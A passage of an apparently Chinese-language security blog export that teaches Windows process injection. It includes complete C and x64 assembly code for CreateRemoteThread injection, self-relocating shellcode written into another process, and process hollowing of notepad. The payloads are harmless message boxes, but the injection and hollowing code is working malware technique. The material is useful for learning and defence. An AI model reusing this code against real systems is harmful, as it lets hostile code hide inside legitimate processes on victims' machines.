Pro）获取目标程序中thread_func的起始地址。我的机器上thread_func起始地址为0x401550。 然后就可以编写创建远程线程的代码： 1234567891011121314151617181920212223#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) { if(argc &lt; 0) { return -1; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); if(NULL == hProcess) { printf(&quot;Open Process Failed! (%d)\\n&quot;, GetLastError()); return -1; } //program中thread_func起始地址为0x401550 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 0x401550, NULL, 0, NULL); if(NULL == hThread) { printf(&quot;Create Thread Failed! (%d)\\n&quot;, GetLastError()); return -1; } CloseHandle(hProcess); CloseHandle(hThread); return 0;} 首先通过OpenProcess获取目标进程的句柄。然后，再将目标进程句柄、thread_func起始内存地址等参数传入CreateRemoteThread当中。这样就可以在目标进程中开启远程线程执行thread_func中的代码了。 运行结果首先运行目标程序program，得知其进程ID为16500，然后再运行remotethread 16500，remotethread程序就可以根据16500获取目标进程的句柄，进而为目标程序开启远程线程。新的线程就会运行thread_func函数中的代码，从而实现对全局变量i清零的操作。之后，remotethread进程退出了，但由于thread_func线程是属于program进程的，因此仍然会继续运行，i会继续被清零。 12345678&gt; programProcess ID: 165000. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 58. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22.","link":"/2021/01/20/windows-thread-remote-thread/"},{"title":"编写具有自我重定位功能的64位代码并注入其他进程","text":"进程注入的一种实现方法是将恶意代码直接复制到目标进程的内存空间，并通过CreateRemoteThread在目标进程中执行这段恶意代码。这个方法的一个难点在于，恶意代码复制到目标进程的内存空间后，它的基地址可能会发生变化。假如说恶意代码需要对自身某个特定地址的数据进行访问，就会访问不到这个数据，因为数据的地址已经改变了。为了解决这一问题，需要进行重定位的操作。 一种重定位的方法是：在注入恶意代码之前，对代码内容进行预处理，根据实际申请到的目标进程内存首地址，修正恶意代码中实际地址与预期地址的差异。这一过程可以借助重定位表来完成，重定位表中包含一个数组，记录了代码中需要重定位的数据的相对虚拟地址RVA。 另一种方式就是恶意代码自身进行重定位，比如下面这段代码： 12345 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax 这段代码执行完毕后，rbx寄存器中就保存了真实地址和预期地址的差值。接下来，假设想要获得变量Variable的真实地址，则可以执行这段代码： 12mov rax, offset Variableadd rbx, rax 执行完毕后，rbx中就包含变量Variable的真实地址了。 编写具有自我重定位功能的64位汇编代码获得64位汇编代码首先选择一个64位汇编的编译器。本文选用的是Visual Studio提供的ml64.exe。MASM for x64 (ml64.exe) 如果对ml64.exe不太熟悉，可以先编写C语言代码，然后再使用Visual Studio的命令行工具将C语言文件转换成汇编语言文件。 要想使用Visual Studio的命令行工具，可以先运行VsDevCmd.bat批处理文件，然后就能直接使用各种命令行工具，而不用输入路径名了。VsDevCmd.bat通常位于Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\Common7\\Tools文件夹下。 首先编写一个无限弹窗C语言代码： 12345678#include &lt;windows.h&gt;#pragma comment(lib, &quot;user32.lib&quot;)int main() { while(1) { MessageBoxA(NULL, &quot;Injected&quot;, &quot;A Window&quot;, MB_ICONSTOP | MB_OK); }} 保存到shellcode.c文件中。接下来，使用Visual Studio的命令行工具cl.exe编译： 12345678910111213141516&gt; vsdevcmd -arch=amd64************************************************************************ Visual Studio 2019 Developer Command Prompt v16.8.4** Copyright (c) 2020 Microsoft Corporation**********************************************************************&gt; cl /FA shellcode.c用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版版权所有(C) Microsoft Corporation。保留所有权利。shellcode.cMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:shellcode.exeshellcode.obj 选项/FA就可以让其产生汇编代码文件shellcode.asm。不过这个时候shellcode.asm内容比较复杂，编译得到的shellcode.exe也比较大（大约90KB）。如果可以简化shellcode.asm，并适当缩小shellcode.exe的体积将会更有利于后续分析。 对shellcode.asm进行修改，得到： 12345678910111213141516171819202122INCLUDELIB user32.libEXTRN __imp_MessageBoxA:PROC_TEXT SEGMENTmain PROC; Line 4 sub rsp, 40 ; 00000028H jmp $LN2@main Caption DB 'MessageBox', 00H Text DB 'Injected', 00H$LN2@main:; Line 6 mov r9d, 16 mov r8, offset Caption mov rdx, offset Text xor ecx, ecx call QWORD PTR __imp_MessageBoxA; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND 删掉了一些不必要的INCLUDE语句，仅保留一个INCLUDELIB，并删去一些不需要的节，如pdata和xdata。此外，还将数据节中的数据转移到代码节，并将数据节给删掉了。 其实我还改了一个地方，就是将第14行和第15行的lea指令修改成mov指令。如果是lea指令，则这里使用的是相对寻址，不需要进行重定位的操作。为了说明重定位的原理，将其修改为mov指令，从而让这里使用绝对寻址。 使用ml64.exe将修改后的shellcode.asm编译链接成可执行文件shellcode.exe： 1234567891011&gt; ml64 shellcode.asm /link /ENTRY:mainMicrosoft (R) Macro Assembler (x64) Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved. Assembling: shellcode.asmMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./OUT:shellcode.exeshellcode.obj/ENTRY:main shellcode.exe的体积缩小到了仅有大约3KB。 添加自我重定位功能在shellcode.asm中，调用MessageBoxA前会进行一系列传参操作。其中，传入Caption和Text的地址使用的是绝对地址。代码注入其他进程后，这个地址可能会发生改变，因此需要进行重定位操作。 12345.text:000000014000101A 41 B9 10 00 00 00 mov r9d, 10h ; uType.text:0000000140001020 49 B8 06 10 00 40 01 00 00 00 mov r8, offset Caption ; &quot;MessageBox&quot;.text:000000014000102A 48 BA 11 10 00 40 01 00 00 00 mov rdx, offset Text ; &quot;Injected&quot;.text:0000000140001034 33 C9 xor ecx, ecx ; hWnd.text:0000000140001036 FF 15 C4 0F 00 00 call cs:MessageBoxA 添加重定位操作后的代码为： 12345678910111213141516171819202122232425262728INCLUDELIB user32.libEXTRN __imp_MessageBoxA:PROC_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax jmp $LN2@main Caption DB 'MessageBox', 00H Text DB 'Injected', 00H$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor ecx, ecx call QWORD PTR __imp_MessageBoxA; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND rbx寄存器保存的就是Caption的真实地址，Caption的长度为11，因此Text的地址就为rbx+11。 用LoadLibraryA和GetProcAddress代替MessageBoxAMessageBoxA是user32.dll提供的一个函数。但是，并不是所有进程都会加载user32.dll，对于那些没有加载user32.dll的进程，注入的代码是无法正常运行的。不过，几乎所有进程都会加载kernel32.dll，而kernel32.dll中又包含LoadLibraryA和GetProcAddress，可以利用它们加载user32.dll并获取MessageBoxA的地址。 123456789101112131415161718192021222324252627282930313233343536373839INCLUDELIB kernel32.libEXTRN __imp_GetProcAddress:PROCEXTRN __imp_LoadLibraryA:PROC_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H ;通过重定位让rbx指向Caption首地址 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax ;调用LoadLibraryA和GetProcAddress获得MessageBoxA lea rcx, [rbx + 20] call QWORD PTR __imp_LoadLibraryA lea rdx, [rbx + 31] mov rcx, rax call QWORD PTR __imp_GetProcAddress mov r12, rax jmp $LN2@main Caption DB 'MessageBox', 00H ;[rbx] Text DB 'Injected', 00H ;[rbx + 11] LibName DB 'user32.dll', 00H ;[rbx + 20] FuncName DB 'MessageBoxA', 00H ;[rbx + 31]$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor rcx, rcx call r12; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND 处理调用系统API的语句现在的代码中有两个调用系统API的语句： 12call QWORD PTR __imp_LoadLibraryAcall QWORD PTR __imp_GetProcAddress 将代码注入目标进程后，这两条语句就有可能不奏效了，因此把这两条语句处理一下。首先找到LoadLibraryA和GetProcAddress的地址，可以写一个很简单的C语言程序来找： 12345678910#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() { void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); printf(&quot;LoadLibraryA Address: %p\\n&quot;, p1); printf(&quot;GetProcAddress Address: %p\\n&quot;, p2); return 0;} 在我当前的电脑上，运行结果为： 12LoadLibraryA Address: 00007FFFC185EBB0GetProcAddress Address: 00007FFFC185A360 因此，对这两条语句作如下修改： 12345mov rax, 00007FFFC185EBB0H ;LoadLibraryA入口地址call raxmov rax, 00007FFFC185A360H ;GetProcAddress入口地址call rax 这里用到了一个性质，就是对于一台电脑上运行的多个进程，系统API的虚拟地址通常是相等的。不过我希望这个代码还能在其他机器上运行，所以这里的00007FFFC185EBB0H和00007FFFC185A360H只是临时的，在注入其他进程之前还会被修改。 最终得到的代码12345678910111213141516171819202122232425262728293031323334353637_TEXT SEGMENTmain PROC sub rsp, 40 ; 00000028H ;通过重定位让rbx指向Caption首地址 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax mov rax, offset Caption add rbx, rax ;调用LoadLibraryA和GetProcAddress获得MessageBoxA lea rcx, [rbx + 20] mov rax, 00007FFFC185EBB0H ;LoadLibraryA入口地址 call rax lea rdx, [rbx + 31] mov rcx, rax mov rax, 00007FFFC185A360H ;GetProcAddress入口地址 call rax mov r12, rax jmp $LN2@main Caption DB 'MessageBox', 00H ;[rbx] Text DB 'Injected', 00H ;[rbx + 11] LibName DB 'user32.dll', 00H ;[rbx + 20] FuncName DB 'MessageBoxA', 00H ;[rbx + 31]$LN2@main:; Line 6 mov r9d, 16 mov r8, rbx lea rdx, [rbx + 11] xor rcx, rcx call r12; Line 7 jmp SHORT $LN2@mainmain ENDP_TEXT ENDSEND 使用ml64.exe生成可执行文件： 1234567891011&gt; ml64 shellcode.asm /link /ENTRY:mainMicrosoft (R) Macro Assembler (x64) Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved. Assembling: shellcode.asmMicrosoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./OUT:shellcode.exeshellcode.obj/ENTRY:main 然后，再将shellcode.exe拖入IDA Pro中，并将代码部分拖黑，再选择Edit-&gt;Export Data，将其导出为C语言数组形式： 1234567891011121314151617unsigned char ida_chars[] ={// 0 1 2 3 4 5 6 7 8 9 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, //0 0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, //1 0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01, //2 0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14, //3 0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, //4 0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48, //5 0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF, //6 0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73, //7 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A, //8 0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, //9 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73, //10 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, //11 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, //12 0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB //13}; 编写进程注入程序获得了C语言数组形式的代码后，接下来要做的就是将代码注入到目标进程的内存空间中，然后在目标进程中执行这段代码了。不过在这之前，先要处理一下LoadLibraryA和GetProcAddress的地址。 之前的代码假定LoadLibraryA和GetProcAddress的地址分别为00007FFFC185EBB0H和00007FFFC185A360H，而这并不总是成立的。所以，先将这两个数值替换为LoadLibraryA和GetProcAddress的实际地址： 123456//获取LoadLibraryA和GetProcAddress的真实地址void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;);//ida_chars[]中LoadLibraryA位于ida_chars[42]，GetProcAddress位于ida_chars[61]*(uint64_t *)(&amp;ida_chars[42]) = (uint64_t)p1;*(uint64_t *)(&amp;ida_chars[61]) = (uint64_t)p2; 然后，就可以将数组ida_chars的内容写到目标进程的内存空间，并CreateRemoteThread开启远程线程执行这段代码了： 123456789101112131415161718192021222324//将ida_chars[]写入目标进程内存空间HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));if(NULL == hProcess) { printf(&quot;OpenProcess Failed: %d\\n&quot;, GetLastError()); return -1;}void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE);if(NULL == mem) { printf(&quot;VirtualAllocEx Failed: %d\\n&quot;, GetLastError()); return -1;}BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL);if(!result) { printf(&quot;WriteProcessMemory Failed: %d\\n&quot;, GetLastError()); return -1;}//创建远程线程执行ida_chars[]中的代码HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL);if(NULL == hRemoteThread) { printf(&quot;CreateRemoteThread Failed: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;Injected!\\n&quot;);return 0; 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;windows.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;unsigned char ida_chars[] ={// 0 1 2 3 4 5 6 7 8 9 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, //0 0x48, 0xB8, 0x09, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, //1 0x48, 0x2B, 0xD8, 0x48, 0xB8, 0x4C, 0x10, 0x00, 0x40, 0x01, //2 0x00, 0x00, 0x00, 0x48, 0x03, 0xD8, 0x48, 0x8D, 0x4B, 0x14, //3 0x48, 0xB8, 0xB0, 0xEB, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, //4 0xFF, 0xD0, 0x48, 0x8D, 0x53, 0x1F, 0x48, 0x8B, 0xC8, 0x48, //5 0xB8, 0x60, 0xA3, 0x85, 0xC1, 0xFF, 0x7F, 0x00, 0x00, 0xFF, //6 0xD0, 0x4C, 0x8B, 0xE0, 0xEB, 0x2B, 0x4D, 0x65, 0x73, 0x73, //7 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x00, 0x49, 0x6E, 0x6A, //8 0x65, 0x63, 0x74, 0x65, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, //9 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x4D, 0x65, 0x73, //10 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x41, //11 0xB9, 0x10, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, //12 0x53, 0x0B, 0x48, 0x33, 0xC9, 0x41, 0xFF, 0xD4, 0xEB, 0xEB //13};int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: inject [pid]\\n&quot;); return -1; } //获取LoadLibraryA和GetProcAddress的真实地址 void *p1 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); void *p2 = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;GetProcAddress&quot;); //ida_chars[]中LoadLibraryA位于ida_chars[42]，GetProcAddress位于ida_chars[61] *(uint64_t *)(&amp;ida_chars[42]) = (uint64_t)p1; *(uint64_t *)(&amp;ida_chars[61]) = (uint64_t)p2; //将ida_chars[]写入目标进程内存空间 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); if(NULL == hProcess) { printf(&quot;OpenProcess Failed: %d\\n&quot;, GetLastError()); return -1; } void *mem = VirtualAllocEx(hProcess, NULL, sizeof(ida_chars), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if(NULL == mem) { printf(&quot;VirtualAllocEx Failed: %d\\n&quot;, GetLastError()); return -1; } BOOL result = WriteProcessMemory(hProcess, mem, ida_chars, sizeof(ida_chars), NULL); if(!result) { printf(&quot;WriteProcessMemory Failed: %d\\n&quot;, GetLastError()); return -1; } //创建远程线程执行ida_chars[]中的代码 HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, mem, NULL, 0, NULL); if(NULL == hRemoteThread) { printf(&quot;CreateRemoteThread Failed: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;Injected!\\n&quot;); return 0;}","link":"/2021/01/24/windows-self-relocation-64bit-code-inject/"},{"title":"Process Hollowing在64位进程中的简单实现","text":"首先，创建一个挂起状态的合法进程（比如notepad进程），然后再使用ZwUnmapViewOfSection或NtUnmapViewOfSection将合法的notepad模块占据的内存空间给unmap掉。接下来，向notepad的内存空间中写入恶意的PE文件，并通过修改进程的context，将入口点改为恶意PE文件的入口点。最后，使用ResumeThread使notepad恢复执行，从而达到在notepad进程空间中运行恶意PE文件的效果。这种方法就是Process Hollowing。 本文大量参考Leitch, J. (n.d.). Process Hollowing.这篇文章。 获取一个符合要求的PE文件Process Hollowing需要将一个PE文件手动加载到其他进程的内存空间中。因此，首先要获取一个PE文件。根据Leitch, J. (n.d.). Process Hollowing.这篇文章的说法，PE文件需要满足以下要求： To successfully perform process hollowing the source image must meet a few requirements: To maximize compatibility, the subsystem of the source image should be set to windows. The compiler should use the static version of the run-time library to remove dependence to the Visual C++ runtime DLL. This can be achieved by using the /MT or /MTd compiler options. Either the preferred base address (assuming it has one) of the source image must match that of the destination image, or the source must contain a relocation table and the image needs to be rebased to the address of the destination. For compatibility reasons the rebasing route is preferred. The /DYNAMICBASE or /FIXED:NO linker options can be used to generate a relocation table. 首先，为了增强PE文件的兼容性，subsystem需要设为windows。在实际操作中，我发现如果subsystem设置成了console，则PE文件无法注入Windows窗口程序（如notepad，calc），只能注入控制台程序（如cmd）。 另外，PE文件不应该依赖Visual C++ runtime DLL，这可以通过在编译时使用/MT或/MTd选项解决。 最后，如果PE文件无法加载到预定的基地址，还需进行重定位操作。不过本文只考虑PE文件可以加载到预定基地址的情况，因此不会进行重定位的操作。 根据上述三个要求，编写如下代码： 123456789101112131415161718#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;#pragma comment(lib, &quot;user32.lib&quot;)int WinMain() { srand(time(NULL)); char str1[20]; sprintf(str1, &quot;Current pid: %d&quot;, GetCurrentProcessId()); char str2[20]; int i; while(i = rand() % 100) { sprintf(str2, &quot;%d &gt; 0&quot;, i); MessageBoxA(NULL, str1, str2, MB_ICONERROR | MB_OK); } return 0;} 然后使用Visual Studio的命令行工具编译： 123456789101112131415161718&gt; vsdevcmd -arch=amd64************************************************************************ Visual Studio 2019 Developer Command Prompt v16.8.4** Copyright (c) 2020 Microsoft Corporation**********************************************************************&gt; cl /MT source.c /link /subsystem:windows用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版版权所有(C) Microsoft Corporation。保留所有权利。source.csource.c(7): warning C4026: 使用形参表声明的函数Microsoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:source.exe/subsystem:windowssource.obj 根据PE文件内容将其加载到内存假设已经将PE文件全部读入内存，并且保存到了一个buf数组当中，现在要获取其装入内存后的情况，并且保存在另一个数组mem中。 首先，找到e_lfanew，并据此定位到其NT映像头： 1234//读取DOS文件头，获取e_lfanewPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0];//获取映像头PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; NT映像头中包含一些信息，比如可执行文件默认装入的地址ImageBase，装入内存后映像的总尺寸SizeOfImage，程序入口点AddressOfEntryPoint等。根据SizeOfImage就可以知道需要多大的内存来保存PE文件装入内存的状态，而ImageBase和AddressOfEntryPoint则在后面的操作需要用到： 12345//根据可选头的SizeOfImage分配内存unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1);(*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase;(*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint;(*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; NT映像头中还包含一个SizeOfHeaders，根据这一数据将PE文件的头部复制到内存中： 12//将文件头复制到内存中memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); 最后，根据节表包含的信息将每一节依次装载到内存中的特定位置： 12345678910//获取节表起始位置PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader];//将每一节的内容依次复制到内存中for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData);} 将上述过程写成load_pe64函数，其完整内容如下： 1234567891011121314151617181920212223unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) { //读取DOS文件头，获取e_lfanew PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0]; //获取映像头 PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; //根据可选头的SizeOfImage分配内存 unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1); (*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase; (*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint; (*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; //获取节表起始位置 PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader]; //将文件头复制到内存中 memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); //将每一节的内容依次复制到内存中 for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData); } return mem;} 编写程序实现Process Hollowing创建挂起的notepad进程创建挂起状态的子进程只需要在CreateProcessA的时候加一句CREATE_SUSPENDED就行了。 12345678910111213141516171819//创建挂起的notepad进程STARTUPINFO si = {0};PROCESS_INFORMATION pi = {0};si.cb = sizeof(si);BOOL result = CreateProcessA( NULL, //lpApplicationName &quot;notepad&quot;, //lpCommandLine NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformationif(!result) { printf(&quot;CreateProcess Failed: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;Create Suspended notepad, pid: %d\\n&quot;, pi.dwProcessId); 获取notepad加载的基地址进程真实加载的地址需要从PEB中找到，所以先要找到PEB的基地址。一种方法是通过NtQueryInformationProcess找到PEB基地址。 1234//获取notepad进程的PEB地址PROCESS_BASIC_INFORMATION processInfo;NtQueryInformationProcess(pi.hProcess, 0, &amp;processInfo, sizeof(processInfo), NULL);printf(&quot;PebBaseAddress: %p\\n&quot;, processInfo.PebBaseAddress); 如果查看微软关于PEB的官方文档，会发现PEB中很多项都是Reserved。要想知道PEB中每一项真实的含义是什么，可以在别的网站上看： PEB (Process Enviroment Block) 然后就可以发现，官方文档中的Reserved3[1]这一项实际上就是ImageBaseAddress，据此就可以找到notepad模块的基地址： 123456//PEB的Reserved3[1]就是notepad进程加载的基地址PEB processPeb;result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL);void *originImageBase = processPeb.Reserved3[1];printf(&quot;ImageBaseAddress: %p\\n&quot;, originImageBase);system(&quot;pause&quot;); 知道了notepad的基地址后，就可以通过NtUnmapViewOfSection将notepad占据的内存给unmap掉了： 123456//unmap合法内存的代码DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase);if(dwResult) { printf(&quot;NtUnmapViewOfSection Failed: %d\\n&quot;, dwResult); return -1;} 将PE文件加载到notepad内存空间中将想要加载的PE文件读入内存： 12345678910111213141516//读取source.exe文件，将PE文件内容全部放入内存FILE *fptr = fopen(&quot;source.exe&quot;, &quot;rb&quot;);if(NULL == fptr) { printf(&quot;Open source.exe Failed!\\n&quot;); return -1;}fseek(fptr, 0L, SEEK_END);long fileSize = ftell(fptr);rewind(fptr);BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000);if(NULL == fileBuf) { printf(&quot;Malloc Failed!\\n&quot;); return -1;}fread(fileBuf, 1, fileSize, fptr);fclose(fptr); 然后，调用之前写的load_pe64函数，将PE文件按照文件结构载入内存中： 1234567//根据PE文件内容生成PE文件载入内存的状态int ImageSize;ULONGLONG newImageBase;DWORD entryPoint;unsigned char *peMem = load_pe64(fileBuf, &amp;ImageSize, &amp;newImageBase, &amp;entryPoint);printf(&quot;SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\\n&quot;, ImageSize, newImageBase, entryPoint); 最后，使用WriteProcessMemory，将这块内存写到notepad的内存空间中： 1234567891011121314151617//VirtualAllocEx申请一块内存加载source.exevoid *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if(mem != (void *)newImageBase) { printf(&quot;VirtualAllocEx Failed, mem: %p&quot;, mem); free(peMem); free(fileBuf); return -1;}//将source.exe写入notepad进程空间中result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL);free(peMem);free(fileBuf);if(!result) { printf(&quot;Load PE Failed: %d\\n&quot;, GetLastError()); return -1;} 由于没有进行重定位操作，这里申请的内存起始地址必须为可执行文件默认装入的内存地址，即PE文件中的ImageBase。 PEB中的ImageBaseAddress这一项也得进行相应的修改： 1234567//修改PEB中的ImageBaseprocessPeb.Reserved3[1] = (PVOID)newImageBase;result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL);if(!result) { printf(&quot;Modify PEB Failed: %d\\n&quot;, GetLastError()); return -1;} 修改进程的contextCONTEXT结构体中存储了一些寄存器的值，可以通过设置notepad进程的context设置它的寄存器的值。 当进程以挂起状态被创建时，它的入口点被存储在了寄存器当中。在32位进程中，存储入口点的寄存器为EAX，所以Leitch, J. (n.d.). Process Hollowing.这篇文章会设置CONTEXT结构体中的Eax这一项。 在64位进程中，存储入口点的寄存器变成了RCX。可以在创建了挂起的notepad进程后，使用x64dbg附加到这个进程上，看一下各个寄存器的值： 其中RCX的值就是&lt;notepad.EntryPoint&gt;。 由于PE文件已经加载到了notepad内存空间中，EntryPoint也发生了相应的变化，故需要对RCX寄存器的值进行修改： 1234567891011121314//修改notepad进程的context，将入口点(rcx寄存器)设置为source.exe的入口点CONTEXT targetContext;targetContext.ContextFlags = CONTEXT_FULL;result = GetThreadContext(pi.hThread, &amp;targetContext);if(!result) { printf(&quot;GetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1;}targetContext.Rcx = newImageBase + entryPoint;result = SetThreadContext(pi.hThread, &amp;targetContext);if(!result) { printf(&quot;SetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1;} 